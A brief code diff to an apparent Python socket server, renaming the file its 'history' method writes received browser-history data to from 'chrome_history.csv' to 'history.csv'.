@@ -71,7 +71,7 @@ class Server():#TODO: ip working,make it exe,always on - turns on restart
         df.to_csv(os.path.join('database','customer',f"{request[1]}.csv"), index=False)
             
     def history(self):
-        path=os.path.join("chrome_history.csv")
+        path=os.path.join("history.csv")
         with open(path, 'wb') as f:
             while True:
                 file = self.current_socket.recv(1024)
